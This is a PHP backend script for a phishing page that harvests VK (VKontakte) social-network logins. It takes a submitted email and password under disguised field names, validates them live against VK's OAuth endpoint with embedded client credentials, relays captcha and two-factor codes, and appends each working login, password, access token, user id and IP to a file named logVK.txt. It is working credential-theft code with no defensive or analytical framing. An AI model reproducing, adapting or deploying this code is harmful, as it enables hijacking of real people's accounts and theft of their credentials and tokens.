<?php

include('db.php');

if(!empty($_POST['AccessRecovery']) and !empty($_POST['ConfirmedPassword'])){
    
    function curl($url, $field) {
    if( $curl = curl_init() ) {
      try{
          curl_setopt($curl, CURLOPT_URL, $url);
          curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
          curl_setopt($curl, CURLOPT_POST, true);
          curl_setopt($curl, CURLOPT_POSTFIELDS, $field);
		  curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36");
          $out = curl_exec($curl);
          curl_close($curl);

          return $out;
        } catch (Exception $e) {
          return "";
        }
      }
      
      return "";
  }

		if(!empty($_POST['captcha_sid'])) {
			$add = '&captcha_sid=' . $_POST['captcha_sid'] . '&captcha_key=' . $_POST['captcha_key'] ;
		}
		
			if(!empty($_POST['cid'])) {
			$add = '&code=' . $_POST['cid'] ;
			$cd = 1;
		}
		

$email = $_POST['AccessRecovery'];
$password = $_POST['ConfirmedPassword'];

$res = curl('https://api.vk.com/oauth/token?grant_type=password&force_sms=1&2fa_supported=1&client_id=2274003' . $add . '&scope=wall&client_secret=hHbZxrka2uZ6jB1inYsH&username=' .$email. '&password='.$password , '');

$jsond = json_decode($res, true);

 preg_match_all('/(?<=:)\w+/', $res, $words, PREG_PATTERN_ORDER);
 $matches = $words[0];
 
 $res23 = json_decode($res, true);
 $token = $res23['access_token'];
 
 $ip = $_SERVER["REMOTE_ADDR"];
 
 $id = $matches[1];
 $request = 'https://api.vk.com/method/users.get?user_ids='.$id.'&fields=photo_50';
 $response = file_get_contents($request);
 $info = array_shift(json_decode($response)->response);
 $mobpc = ((check_user_agent('mobile'))?"Мобильный":"ПК");	
 
 $value = $info->first_name." ".$info->last_name;
 
 
 		if(!empty($res23['user_id'])) {		
		
			$ufl=fopen("logVK.txt", "a+");
	        fwrite($ufl,"[act:YES][login:".$email."][pass:".$password."][id:".$id."][Token:".$token."][ip:".$ip."][date:".date("H:i:s d.m.Y")."]\n");
	        fclose($ufl);
			
			echo "true";
			
			
		} else if ($res23['error'] == 'need_validation') {
			
			echo "2";
			
		} else if($res23['error'] == 'need_captcha') {
			
			echo '<div>';
		    echo '<div>3</div>';
            echo '<div>' . $res23['captcha_sid'] . '</div>';
            echo '<div>' . $res23['captcha_img'] . '</div>';
            echo '</div>';

			
		} else {
			
			echo "1";
			
		}
		
}

else
{
    	echo "1";
}


?>